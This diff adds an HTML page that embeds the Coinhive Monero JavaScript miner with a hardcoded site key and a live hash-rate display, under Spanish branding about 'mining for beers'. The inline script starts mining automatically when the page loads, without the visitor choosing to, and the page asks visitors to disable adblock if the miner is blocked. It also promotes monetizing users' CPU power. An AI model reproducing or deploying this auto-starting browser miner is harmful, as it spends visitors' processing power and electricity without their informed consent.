@@ -1,0 +1,125 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <title>
+                Coinhive – Monero JavaScript Mining
+    </title>
+    <meta name="description" content="Monero JavaScript Miner">
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+    <meta name="viewport" content="width=device-width">
+    <link rel="stylesheet" href="./media/styles.css">
+    <link rel="icon" type="image/png" href="./media/coinhive-icon.png">
+    <link rel="apple-touch-icon" href="./media/coinhive-icon.png">
+    <script type="text/javascript" src="./scripts/syntax-highlight.js" async></script>
+</head>
+<body>
+
+<div class="container">
+
+<div class="row navigation">
+    <a class="active"       href="/">
+        <img src="./media/coinhive-icon.png" class="navigation-icon"/>
+        Ideable
+    </a>
+</div>
+<div class="row">
+    
+    <div class="six columns claim">
+        <img src="./media/coinhive-icon.png" class="logo"/>
+        <h2>
+            Lo minado</br>para birras
+        </h2>
+    </div>
+
+    <div class="six columns stopped" id="miner">
+        <div class="row">
+            <div class="four columns">
+                <h4 class="number-label">Hashes/s</h4>
+                <h2 id="mining-hashes-per-second">0.0</h2>
+            </div>
+            <div class="four columns">
+                <h4 class="number-label">Total</h4>
+                <h2 id="mining-hashes-total">0</h2>
+            </div>
+            <div class="four columns">
+                <h4 class="number-label">Threads</h4>
+                <h2>
+                    <span id="mining-threads">2</span>
+                    <span id="mining-threads-add" class="action">+</span>
+                    <span class="mining-divide"> / </span>
+                    <span id="mining-threads-remove" class="action">−</span>
+                </h2>
+            </div>
+        </div>
+        <div id="mining-stats-container">
+            <canvas id="mining-stats-canvas"></canvas>
+            <div id="mining-controls">
+                <a href="#" class="mining-button" id="mining-start">
+                    <svg class="mining-icon play-button" viewBox="0 0 200 200" alt="Start Mining">
+                        <circle cx="100" cy="100" r="90" fill="none" stroke-width="15" class="mining-stroke"/>
+                        <polygon points="70, 55 70, 145 145, 100" class="mining-fill"></polygon>
+                    </svg>
+                    Start Mining
+                </a>
+                <a href="#" class="mining-button" id="mining-stop">
+                    <svg class="mining-icon pause-button" viewBox="0 0 200 200" alt="Pause">
+                        <circle cx="100" cy="100" r="90" fill="none" stroke-width="15" class="mining-stroke"/>
+                        <rect x="70" y="50" width="20" height="100" class="mining-fill"/>
+                        <rect x="110" y="50" width="20" height="100" class="mining-fill"/>
+                    </svg>
+                </a>
+            </div>
+            <div id="blk-warning" class="blk-warn" style="display: none">
+                Library failed to load.<br/><strong>Please disable adblock!</strong>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script type="text/javascript" src="./scripts/coinhive.min.js"></script>
+<script type="text/javascript" src="./scripts/miner-ui.js"></script>
+<script type="text/javascript">
+    var miner = null;
+    try {
+        miner = new CoinHive.Anonymous('N0McPYQV4Y7Qsqa0JcuusSCKMFfLofv1', {threads: 2});
+    } catch(e) {}
+
+    var ui = new MinerUI(miner, {
+        container: document.getElementById('miner'),
+        canvas: document.getElementById('mining-stats-canvas'),
+        hashesPerSecond: document.getElementById('mining-hashes-per-second'),
+        hashesPerSecond: document.getElementById('mining-hashes-per-second'),
+        threads: document.getElementById('mining-threads'),
+        threadsAdd: document.getElementById('mining-threads-add'),
+        threadsRemove: document.getElementById('mining-threads-remove'),
+        hashesTotal: document.getElementById('mining-hashes-total'),
+        startButton: document.getElementById('mining-start'),
+        stopButton: document.getElementById('mining-stop'),
+        blkWarn: document.getElementById('blk-warning')
+    });
+
+    //Start mining
+    ui.start();
+</script>
+
+<h3 class="call-to-action">
+    Monetize Your Business With Your Users' CPU Power
+</h3>
+
+<p class="call-to-action">
+    <a class="button primary" href="https://coin-hive.com/">
+        Integrate Coinhive on your Website
+    </a>
+</p>
+
+
+<div class="foot">
+    © 2017 
+</div>
+
+
+</div>
+</body>
+</html>
